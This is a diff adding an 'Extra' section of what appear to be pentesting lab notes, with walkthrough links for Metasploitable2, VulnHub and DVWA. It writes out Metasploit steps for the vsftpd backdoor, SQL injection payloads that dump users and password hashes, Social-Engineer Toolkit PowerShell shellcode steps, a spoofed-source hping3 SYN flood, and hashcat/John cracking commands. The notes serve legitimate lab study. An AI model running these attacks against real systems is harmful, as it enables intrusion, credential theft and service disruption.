@@ -51,6 +51,72 @@ Sincerely,
 IT Support Team
 [Institution Name]
 
+# Extra
+* Metasploitable2 exploit:
+
+https://rajeshmenghwar.medium.com/introduction-abdc1c5cd41b
+
+search vsftpd
+use exploit /unix/ftp/vsftpd_234_backdoor
+show options
+set rhosts 10.0.2.8
+exploit
+
+
+* Csec exploit:
+https://medium.com/@sanjaisaayuj/csec-vulnhub-walk-through-d1de814a9f63
+
+https://blog.razrsec.uk/basic-pentesting-1-walkthrough/
+
+https://medium.com/@z6157881/basic-pentesting-1-walkthrough-vulnhub-00b1fe084167
+
+* Corrosion2:
+https://medium.com/@z6157881/corrosion-2-vulnhub-walkthrough-30c00787fa5d
+
+https://www.hackingarticles.in/corrosion-2-vulnhub-walkthrough/
+
+
+* SQL injections:
+https://medium.com/@aayushtiruwa120/dvwa-sql-injection-91b4efb683e4
+
+When DVWA security is set to LOW:
+1.)Reveals all user is:1' OR '1'='1'#
+2.)Reveals name of all tables in the database:'UNION SELECT table_name, NULL FROM information_schema.tables#
+3.)Reveals all the column names form 'users' table:'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+4.)Reveals all the usernames and password hashes:'UNION SELECT user, password FROM users#
+
+
+* SET alpha numeric:
+sudo setoolkit
+1) Social-Engineering Attacks
+9) Powershell Attack Vectors
+3) PowerShell Alphanumeric Shellcode Injector
+
+
+* Dos Attack:
+sudo hping3 -S <target IP> -a <fake src IP> -p <port(s)> --flood` | SYN Flood attack |
+ip.addr==<kalivm>
+
+* Passcracking:
+ ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special char
+
+| Command                                                                                                     | Description         |
+| ----------------------------------------------------------------------------------------------------------- | ------------------- |
+| `hashcat -m <mode> -a <attack-mode> hash.txt wordlist.txt`                                                  | General format      |
+| `sudo apt install wordlists`<br>`gunzip rockyou.txt.gz`                                                     | Install wordlists   |
+| Modes: `0=MD5`, `100=SHA1`, `1700=SHA2-512`, `22000=WPA`                                                    | Hash types          |
+| Masks: `?d?d?d?d`, `?l?l?l`, `?u?u`, `?a`                                                                   | Brute-force symbols |
+| Attack Modes: `0=Dict`, `1=Combo`, `3=Brute`, `6=Hybrid Left`, `7=Hybrid Right`                             |                     |
+| Options: `--session`, `--status`, `--force`, `-o`, `--remove`, `--benchmark`, `--restore`, `--potfile-path` |                     |
+
+
+https://www.stationx.net/how-to-use-hydra/?utm_source=chatgpt.com
+
+git clone https://github.com/openwall/john.git
+cd john/run
+office2john.py >> Helps extract password hashes from the documents
+python3 office2john.py <Document.extension > = Password hash
+
 
 
 
